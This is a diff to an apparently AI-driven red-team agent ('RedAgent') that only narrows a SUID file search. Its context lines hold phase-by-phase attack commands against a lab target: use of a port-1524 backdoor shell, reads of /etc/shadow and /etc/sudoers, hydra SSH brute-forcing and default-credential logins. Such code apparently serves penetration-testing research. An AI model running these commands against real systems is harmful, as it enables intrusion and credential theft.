@@ -379,7 +379,7 @@ class RedAgent(EnhancedAgentBase, MemorySyncInterface):
                     "recon": "nmap -sV -sC -p- 10.10.10.10",
                     "enumeration": "mysql -h 10.10.10.10 -u root -e 'show databases'",
                     "exploit": "{ echo 'id; whoami'; sleep 2; } | timeout 10 telnet 10.10.10.10 1524",
-                    "privesc": "{ echo 'find / -perm -u=s -type f 2>/dev/null | head -20'; sleep 2; } | timeout 10 telnet 10.10.10.10 1524",
+                    "privesc": "{ echo 'find /usr /bin /sbin -perm -u=s -type f 2>/dev/null | head -20'; sleep 2; } | timeout 10 telnet 10.10.10.10 1524",
                     "exfiltrate": "{ echo 'cat /etc/shadow'; sleep 2; } | timeout 10 telnet 10.10.10.10 1524",
                 }
                 command = fallback_commands.get(phase, "echo 'Fallback command'")
@@ -408,7 +408,7 @@ class RedAgent(EnhancedAgentBase, MemorySyncInterface):
                 "recon": "nmap -sV -sC -p- 10.10.10.10",
                 "enumeration": "showmount -e 10.10.10.10",
                 "exploit": "telnet 10.10.10.10 1524",
-                "privesc": "find / -perm -u=s -type f 2>/dev/null",
+                "privesc": "find /usr /bin /sbin -perm -u=s -type f 2>/dev/null",
                 "exfiltrate": "{ echo 'cat /etc/shadow'; sleep 2; } | timeout 10 telnet 10.10.10.10 1524",
             }
             command = fallback_commands.get(phase, "echo 'Error fallback'")
@@ -486,7 +486,7 @@ class RedAgent(EnhancedAgentBase, MemorySyncInterface):
                                 "sshpass -p msfadmin ssh -o StrictHostKeyChecking=no -o HostKeyAlgorithms=+ssh-rsa msfadmin@target 'id; whoami'"
                             ],
                             "privesc": [
-                                "{ echo 'find / -perm -u=s -type f 2>/dev/null | head -20'; sleep 2; } | timeout 10 telnet target 1524",
+                                "{ echo 'find /usr /bin /sbin -perm -u=s -type f 2>/dev/null | head -20'; sleep 2; } | timeout 10 telnet target 1524",
                                 "{ echo 'uname -a'; sleep 2; } | timeout 10 telnet target 1524",
                                 "{ echo 'cat /etc/crontab'; sleep 2; } | timeout 10 telnet target 1524",
                                 "{ echo 'id; cat /etc/sudoers'; sleep 2; } | timeout 10 telnet target 1524"
@@ -2098,7 +2098,7 @@ Respond in JSON: {{"improvements": [...], "reinforce": [...], "new_strategy": ".
             "recon": f"nmap -sT -sV {target}",
             "enumeration": f"gobuster dir -u http://{target} -w /usr/share/dirb/wordlists/common.txt",
             "exploit": f"hydra -l admin -P /usr/share/nmap/nselib/data/passwords.lst ssh://{target}",
-            "privesc": "find / -perm -u=s -type f 2>/dev/null",
+            "privesc": "find /usr /bin /sbin -perm -u=s -type f 2>/dev/null",
             "exfiltrate": "zip -r /tmp/data.zip /etc/passwd"
         }
         
